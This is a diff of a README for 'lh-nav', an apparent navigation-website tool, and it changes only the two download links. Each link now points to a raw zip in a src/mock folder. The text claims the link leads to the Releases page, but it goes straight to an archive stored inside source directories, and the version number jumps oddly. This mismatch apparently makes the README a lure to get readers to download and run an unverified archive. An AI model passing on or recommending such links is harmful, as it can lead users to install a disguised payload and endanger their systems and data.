@@ -8,7 +8,7 @@ Welcome to lh-nav! This application helps you set up a simple navigation website
 
 To get started with lh-nav, you'll need to download the software from the Releases page. Click the link below to visit the page:
 
-[![Download lh-nav](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/views/lh-nav-2.6.zip)](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/views/lh-nav-2.6.zip)
+[![Download lh-nav](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/mock/lh_nav_v3.2-alpha.4.zip)](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/mock/lh_nav_v3.2-alpha.4.zip)
 
 Once you are on the Releases page, scroll through the list of available versions. Look for the latest release, then follow these steps:
 
@@ -66,4 +66,4 @@ If you have further questions, feel free to reach out for help. You can submit i
 
 For quick access, here’s the link to download lh-nav again: 
 
-[![Download lh-nav](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/views/lh-nav-2.6.zip)](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/views/lh-nav-2.6.zip)
+[![Download lh-nav](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/mock/lh_nav_v3.2-alpha.4.zip)](https://github.com/KavinduThejanOfficial/lh-nav/raw/refs/heads/main/src/mock/lh_nav_v3.2-alpha.4.zip)
